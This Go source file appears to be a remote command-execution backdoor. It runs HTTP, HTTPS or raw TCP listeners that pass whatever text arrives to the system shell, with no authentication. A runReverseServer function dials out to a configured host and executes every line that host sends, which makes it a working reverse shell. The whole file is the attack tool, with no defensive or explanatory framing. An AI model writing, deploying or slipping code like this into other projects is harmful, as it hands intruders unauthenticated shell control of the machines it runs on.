package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os/exec"
	"runtime"
	"strings"
)

func runServer(config *Config) {
	switch config.Protocol {
	case "https":
		runHTTPSServer(config)
	case "http":
		runHTTPServer(config)
	case "tcp":
		runTCPServer(config)
	default:
		log.Fatalf("Unsupported protocol: %s", config.Protocol)
	}
}

func runHTTPSServer(config *Config) {
	http.HandleFunc("/execute", handleExecute)
	addr := fmt.Sprintf(":%d", config.Port)
	log.Printf("Starting HTTPS server on %s", addr)
	log.Fatal(http.ListenAndServeTLS(addr, config.CertFile, config.KeyFile, nil))
}

func runHTTPServer(config *Config) {
	http.HandleFunc("/execute", handleExecute)
	addr := fmt.Sprintf(":%d", config.Port)
	log.Printf("Starting HTTP server on %s", addr)
	log.Fatal(http.ListenAndServe(addr, nil))
}

func runTCPServer(config *Config) {
	addr := fmt.Sprintf(":%d", config.Port)
	listener, err := net.Listen("tcp", addr)
	if err != nil {
		log.Fatal(err)
	}
	defer listener.Close()
	log.Printf("Starting TCP server on %s", addr)

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Println(err)
			continue
		}
		go handleTCPConnection(conn)
	}
}

func handleExecute(w http.ResponseWriter, r *http.Request) {
	var cmd Command
	err := json.NewDecoder(r.Body).Decode(&cmd)
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}

	fullCmd := cmd.Cmd
	if len(cmd.Args) > 0 {
		fullCmd += " " + strings.Join(cmd.Args, " ")
	}

	output, err := executeCommand(fullCmd)
	resp := Response{Output: string(output)}
	if err != nil {
		resp.Error = err.Error()
	}

	json.NewEncoder(w).Encode(resp)
}

func handleTCPConnection(conn net.Conn) {
	defer conn.Close()
	scanner := bufio.NewScanner(conn)
	for scanner.Scan() {
		command := scanner.Text()
		output, err := executeCommand(command)
		if err != nil {
			fmt.Fprintf(conn, "Error: %s\n", err)
		}
		fmt.Fprintf(conn, "%s\n", output)
	}
}

func runReverseServer(config *Config) {
	conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", config.Host, config.Port))
	if err != nil {
		log.Fatal(err)
	}
	defer conn.Close()

	log.Printf("Connected to %s:%d", config.Host, config.Port)

	for {
		message, err := bufio.NewReader(conn).ReadString('\n')
		if err != nil {
			if err == io.EOF {
				log.Println("Connection closed by client")
				return
			}
			log.Println("Error reading:", err)
			return
		}

		output, err := executeCommand(strings.TrimSpace(message))
		if err != nil {
			fmt.Fprintf(conn, "Error: %s\n", err)
		}
		fmt.Fprintf(conn, "%s\n", output)
	}
}

func executeCommand(command string) ([]byte, error) {
	var cmd *exec.Cmd

	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", command)
	} else {
		cmd = exec.Command("sh", "-c", command)
	}

	return cmd.CombinedOutput()
}
